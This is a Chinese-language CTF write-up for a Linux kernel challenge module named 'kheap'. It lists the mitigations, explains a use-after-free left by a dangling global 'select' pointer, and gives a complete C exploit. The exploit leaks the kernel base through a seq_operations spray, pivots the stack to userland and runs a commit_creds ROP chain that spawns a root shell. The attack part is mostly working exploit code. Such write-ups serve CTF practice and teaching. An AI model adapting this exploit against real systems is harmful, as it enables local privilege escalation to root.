一、逆向分析

start.sh

#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -monitor /dev/null \
    -append "console=ttyS0 oops=panic panic=1 kaslr quiet" \
    -cpu kvm64,+smep \
    -smp cores=2,threads=1 \
    -nographic \
    -s

开了kaslr、smep，经过实验也开启了PTI

开了canary

注册了一个混杂设备“kheap”

我们传入的结构体应为

struct request_t{
	size_t idx;
	char *buf;
};

ioctl实现了add、del、select的功能，分配内存大小为0x20

select是一个全局变量，存储我们要操作的内存指针

read 存在_check_object_size，对obj的size进行检测，write 也是同理

二、利用思路

del虽然把list中的指针置空了，但是全局变量select的存储的指针仍然存在，存在UAF

三、EXP

0x20的堆块，UAF喷射seq_operations，泄露内核基址后直接stack pivot到用户空间走ropchain，当然利用pt_regs打栈也可以

#define _GNU_SOURCE 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/mman.h>

#define CMD_ADD 0x10000
#define CMD_DEL 0x10001
#define CMD_SELECT 0x10002
#define POP_RDI_RET 0xffffffff8102517a+koff
#define POP_RCX_RET 0xffffffff81399238+koff
#define MOV_ESP_0x39000000_RET 0xffffffff819f3361+koff
#define MOV_RDI_RAX_REP_MOVSQ_RET 0xffffffff81bebe6b+koff

size_t commit_creds = 0xffffffff810ce710;
size_t prepare_kernel_cred = 0xffffffff810cebf0;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0;
/*
user_cs;
user_rflags;
user_sp;
user_ss;
*/
size_t user_cs,user_ss,user_rsp,user_rflags;
static void saveStatus(){
	asm volatile(
		"mov %0,cs;"
		"mov %1,ss;"
		"mov %2,rsp;"
		"pushf;"		
		"pop %3;"	    
		: "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags) 
		:			
	);
	puts("[*] Success to saveStatus!");
}

static void errExit(char * msg){
    printf("\033[1;31m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

/* to run the exp on the specific core only */
void bindCore(int core)
{
    cpu_set_t cpu_set;
	puts("[*] set cpu affinity");
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

static void getRootShell(void){
	if (!getuid()){
		puts("\033[1;31;37m[*] <Successfully Get Root Privileges>\033[0m");
		system("/bin/sh");
	}
	else{
		puts("\033[1;31m[-] <Get Root Error>\033[0m");
	}
}

int fd;
size_t buf[0x400];
struct request_t{
	size_t idx;
	char *buf;
}req;

void add(size_t idx){
	req.idx = idx;
	int r = ioctl(fd, CMD_ADD, &req);
	if (r<0) errExit("add"); 
}

void del(size_t idx){
	req.idx = idx;
	int r = ioctl(fd, CMD_DEL, &req);
	if (r<0) errExit("del"); 
}

void sel(size_t idx){
	req.idx = idx;
	int r = ioctl(fd, CMD_SELECT, &req);
	if (r<0) errExit("sel"); 
}

int main(int argc, char *argv[], char *envp[]){
	saveStatus();
	fd = open("/dev/kheap",O_RDWR);
	if (fd>0) puts("[+] Dev Opened");
	add(0);
	sel(0);
	del(0);
	int seq_fd = open("/proc/self/stat", O_RDONLY);
	
	read(fd, buf, 0x8);
	size_t leak = *(size_t *)&buf;
	size_t koff = leak-0xffffffff8133f980;
	printf("[*] koff => 0x%lx\n", koff);
	commit_creds+=koff;
	prepare_kernel_cred+=koff;
	swapgs_restore_regs_and_return_to_usermode+=koff;

	char *userland = mmap((void *)(0x39000000 - 0x4000), 0x8000, 
		PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

	size_t ropchain[0x40];
	int i;
	ropchain[i++] = POP_RDI_RET;
	ropchain[i++] = 0;
	ropchain[i++] = prepare_kernel_cred;
	ropchain[i++] = POP_RCX_RET;
	ropchain[i++] = 0;
	ropchain[i++] = MOV_RDI_RAX_REP_MOVSQ_RET;
	ropchain[i++] = commit_creds;
	ropchain[i++] = swapgs_restore_regs_and_return_to_usermode+22;
	ropchain[i++] =	0xdeadbeef;
	ropchain[i++] = 0xdeadbeef;
	ropchain[i++] = (size_t)getRootShell;
	ropchain[i++] =	user_cs;
	ropchain[i++] = user_rflags;
	ropchain[i++] = user_rsp;
	ropchain[i++] = user_ss;
	memcpy(userland+0x4000, ropchain, sizeof(ropchain));

	*(size_t *)&buf = MOV_ESP_0x39000000_RET;
	write(fd, buf, 0x8);

	puts("[*] seq.start");
	read(seq_fd, "X1NRI", 0x6);
	return 0;
}
